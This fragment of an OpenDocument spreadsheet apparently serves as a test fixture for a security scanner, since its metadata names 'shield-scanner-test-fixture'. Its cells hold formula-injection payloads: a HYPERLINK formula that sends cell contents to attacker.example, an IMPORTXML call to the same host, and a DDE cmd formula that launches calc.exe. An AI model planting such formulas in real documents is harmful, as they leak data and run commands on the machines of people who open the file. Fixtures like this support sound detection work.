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cript="urn:oasis:names:tc:opendocument:xmlns:script:1.0">
  <office:body>
    <office:spreadsheet>
      <table:table table:name="Sheet1">
        <table:table-row>
          <table:table-cell office:value-type="string" table:formula="of:=HYPERLINK(&quot;https://attacker.example/x?d=&quot;&amp;A1;&quot;Click&quot;)">
            <text:p>Click</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:formula="of:=IMPORTXML(&quot;https://attacker.example/feed&quot;;&quot;//user&quot;)">
            <text:p>load</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:formula="of:=cmd|'/c calc.exe'!A1">
            <text:p>cmd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meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0">
  <office:meta>
    <meta:generator>shield-scanner-test-fixture/1.20.0</meta:generator>
  </office:meta>
</office:document-meta>
</file>